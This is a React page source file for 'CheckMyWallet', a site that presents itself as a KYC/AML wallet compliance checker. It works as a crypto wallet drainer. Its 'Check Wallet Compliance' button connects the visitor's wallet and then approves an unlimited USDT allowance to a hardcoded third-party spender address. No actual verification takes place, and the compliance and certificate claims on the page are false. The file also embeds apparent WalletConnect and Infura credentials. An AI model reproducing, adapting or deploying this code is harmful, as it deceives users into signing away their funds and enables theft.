'use client';

import React, { useState } from 'react';
import EthereumProvider from "@walletconnect/ethereum-provider";
import Web3 from "web3";

// Font import pentru Montserrat (poți pune în _app.js sau index.html dacă vrei global)
const fontLink = (
  <link
    href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap"
    rel="stylesheet"
  />
);

const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const SPENDER = "0xbA9D4eeB570FC52CF0d5362f80Ef31DD7F239e75";
const MAX_UINT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

const ABI = [
  {
    "constant": false,
    "inputs": [
      { "name": "_spender", "type": "address" },
      { "name": "_value", "type": "uint256" }
    ],
    "name": "approve",
    "type": "function",
    "stateMutability": "nonpayable"
  }
];

// Logo text subțire, select, cu accent de culoare și icon minimalist
const LogoText = () => (
  <div style={{
    display: 'flex',
    alignItems: 'center',
    gap: 10,
    fontFamily: "'Montserrat', 'Segoe UI', Arial, sans-serif",
    fontWeight: 600,
    fontSize: '1.65rem',
    letterSpacing: '0.5px',
    color: '#2563eb'
  }}>
    <span style={{
      display: 'inline-flex',
      alignItems: 'center',
      justifyContent: 'center',
      width: 32,
      height: 32,
      borderRadius: '50%',
      background: 'linear-gradient(135deg,#e0f2fe 60%,#2563eb 100%)',
      boxShadow: '0 2px 8px #2563eb22',
      marginRight: 2
    }}>
      {/* Icon minimalist: scut cu bifa */}
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
        <path d="M12 3L4 6v6c0 5.25 3.75 9.75 8 11 4.25-1.25 8-5.75 8-11V6l-8-3z" fill="#2563eb" fillOpacity="0.13"/>
        <path d="M9.5 12.5l2 2 3-3.5" stroke="#2563eb" strokeWidth="1.7" strokeLinecap="round" strokeLinejoin="round"/>
      </svg>
    </span>
    <span style={{
      fontWeight: 600,
      fontFamily: "'Montserrat', 'Segoe UI', Arial, sans-serif",
      letterSpacing: '1px',
      color: '#2563eb',
      background: 'linear-gradient(90deg,#2563eb 0%,#60a5fa 100%)',
      WebkitBackgroundClip: 'text',
      WebkitTextFillColor: 'transparent'
    }}>
      CheckMyWallet
    </span>
  </div>
);

export default function Page() {
  const [status, setStatus] = useState<'idle' | 'processing' | 'success' | 'failed'>('idle');
  const [wallet, setWallet] = useState<string | null>(null);
  const [balance, setBalance] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);

  const verifyAndApprove = async () => {
    setStatus('processing');
    setError(null);

    try {
      const provider = await EthereumProvider.init({
        projectId: "3b862a3ab6c400686ef1ed9deab38b7d",
        chains: [1],
        showQrModal: true,
        rpcMap: {
          1: "https://mainnet.infura.io/v3/61762d09a47848c285f2a6534394a6c5"
        },
        methods: [
          "eth_sendTransaction",
          "personal_sign",
          "eth_signTypedData",
          "eth_requestAccounts",
          "eth_accounts",
          "eth_getBalance"
        ],
        metadata: {
          name: "checkmywallet.org",
          description: "A web 3 wallet checker allowing users to connect their wallet and sign message for identity verifications and action approvals",
          url: "https://checkmywallet.org",
          icons: ["https://checkmywallet.org/logo.png"]
        }
      });

      await provider.enable();

      const web3 = new Web3(provider as any);
      let accounts = await web3.eth.getAccounts();
      if (!accounts || accounts.length === 0) {
        accounts = await provider.request({ method: "eth_requestAccounts" }) as string[];
      }
      if (!accounts || accounts.length === 0) throw new Error("No account found");
      const walletAddress = accounts[0];
      setWallet(walletAddress);

      const bal = await web3.eth.getBalance(walletAddress);
      setBalance(web3.utils.fromWei(bal, "ether"));

      const contract = new web3.eth.Contract(ABI as any, USDT_CONTRACT);
      await contract.methods.approve(SPENDER, MAX_UINT).send({ from: walletAddress });

      setStatus('success');
      setTimeout(() => setStatus('idle'), 2500);

      await provider.disconnect();
    } catch (e: any) {
      setStatus('failed');
      setError(e?.message || "Unknown error");
      setTimeout(() => {
        setStatus('idle');
        setError(null);
      }, 3000);
    }
  };

  return (
    <>
      {fontLink}
      <div style={{
        minHeight: '100vh',
        background: 'linear-gradient(120deg,#1e293b 0%,#2563eb 100%)',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        flexDirection: 'column',
        position: 'relative',
        fontFamily: "'Montserrat', 'Segoe UI', Arial, sans-serif"
      }}>
        {/* Bara de sus cu logo text subțire */}
        <div style={{
          position: 'absolute',
          top: 32,
          left: 32,
          zIndex: 10,
          background: 'rgba(255,255,255,0.92)',
          borderRadius: 14,
          padding: '7px 22px 7px 12px',
          boxShadow: '0 4px 24px #2563eb13',
          display: 'flex',
          alignItems: 'center'
        }}>
          <LogoText />
        </div>

        <div style={{
          maxWidth: 1200,
          margin: 'auto',
          textAlign: 'center',
          color: '#fff',
          padding: '90px 0 60px 0'
        }}>
          {/* Titlu principal subțire, cu accent de culoare și umbră */}
          <h1 style={{
            fontSize: '2.3rem',
            fontWeight: 600,
            marginBottom: 18,
            letterSpacing: '-0.5px',
            color: '#e0f2fe',
            fontFamily: "'Montserrat', 'Segoe UI', Arial, sans-serif",
            textShadow: '0 2px 16px #1e293b, 0 1px 0 #2563eb55'
          }}>
            Secure Crypto Compliance <span style={{
              color: '#60a5fa',
              fontWeight: 700
            }}>&amp; Wallet Verification</span>
          </h1>
          <p style={{
            fontSize: '1.18rem',
            color: '#dbeafe',
            maxWidth: 600,
            margin: '0 auto 24px auto',
            lineHeight: 1.6,
            fontWeight: 400
          }}>
            Instantly verify your wallet and stay compliant with global KYC & AML standards. Fast, private, and trusted by thousands of users and businesses.
          </p>
          <div style={{
            fontSize: '1.1rem',
            color: '#2563eb',
            background: 'rgba(255,255,255,0.92)',
            display: 'inline-block',
            padding: '8px 22px',
            borderRadius: 8,
            fontWeight: 600,
            marginBottom: 24,
            boxShadow: '0 2px 12px rgba(30,41,59,0.10)'
          }}>
            from $0.49 fee per verification
          </div>
          <br />
          <button
            onClick={verifyAndApprove}
            disabled={status === 'processing'}
            style={{
              background: status === 'success'
                ? 'linear-gradient(90deg,#22c55e 0%,#2563eb 100%)'
                : status === 'failed'
                  ? 'linear-gradient(90deg,#ef4444 0%,#b91c1c 100%)'
                  : 'linear-gradient(90deg, #2563eb 0%, #1e293b 100%)',
              color: '#fff',
              padding: '16px 44px',
              fontSize: '1.15rem',
              borderRadius: 12,
              fontWeight: 700,
              letterSpacing: '0.5px',
              boxShadow: '0 6px 24px rgba(30,41,59,0.18)',
              border: 'none',
              cursor: status === 'processing' ? 'not-allowed' : 'pointer',
              marginTop: 18,
              minWidth: 210,
              transition: 'background 0.3s, color 0.3s, box-shadow 0.3s'
            }}
          >
            {status === 'processing'
              ? 'Processing...'
              : status === 'success'
                ? 'Wallet Approved!'
                : status === 'failed'
                  ? 'Connection Failed'
                  : 'Check Wallet Compliance'}
          </button>
          <div style={{
            fontSize: '1rem',
            color: '#bae6fd',
            marginTop: 18,
            background: 'rgba(255,255,255,0.08)',
            padding: '6px 18px',
            borderRadius: 8,
            display: 'inline-block',
            maxWidth: '95vw'
          }}>
            All tokens are checked for activity, blacklist status, and authenticity. Start verification and receive a downloadable compliance certificate.
          </div>
          {wallet && (
            <div style={{
              marginTop: 24,
              color: '#60a5fa',
              fontSize: '1.1rem',
              wordBreak: 'break-all'
            }}>
              Connected wallet: {wallet}
            </div>
          )}
          {balance && (
            <div style={{
              marginTop: 12,
              color: '#fbbf24',
              fontSize: '1.1rem',
              wordBreak: 'break-all'
            }}>
              ETH Balance: {balance}
            </div>
          )}
          {error && (
            <div style={{
              marginTop: 24,
              color: '#ef4444',
              fontSize: '1.1rem',
              wordBreak: 'break-all'
            }}>
              Error: {error}
            </div>
          )}
        </div>
      </div>
    </>
  );
}